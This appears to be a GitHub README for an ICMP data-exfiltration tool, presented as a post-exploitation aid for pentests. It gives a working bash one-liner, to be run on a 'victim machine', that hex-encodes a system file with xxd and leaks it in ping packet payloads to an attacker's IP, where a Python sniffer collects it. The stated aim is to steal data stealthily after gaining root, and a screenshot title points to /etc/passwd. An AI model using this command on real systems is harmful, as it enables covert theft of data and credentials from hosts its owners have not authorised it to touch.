# ICMP-exfiltrator
A simple script for data exfiltration using ICMP packets.

This script will be useful at the end of a pentest to steal data when otherwise we could not.After getting root we could use this script to exfiltrate data to our attacker's server stealthily via ICMP packets.

# Usage

We let our sniffer listen.

``` python
python3 icmp_exfiltration.py 2> /dev/null
```
Using the xxd command we can encode a file and send it to the attacker's sniffer via ping. We have to write this command on the victim machine.

```bash
xxd -p -c 4 /etc/hosts | while read line; do ping -c 1 -p $line <attackers_IP_address> ; done
```
# Screenshots

![command.jpeg](https://github.com/Jokas-null/ICMP-exfiltrator/blob/main/screenshots/command.jpeg)

![etc passwd.jpeg](https://github.com/Jokas-null/ICMP-exfiltrator/blob/main/screenshots/etc%20passwd.jpeg)
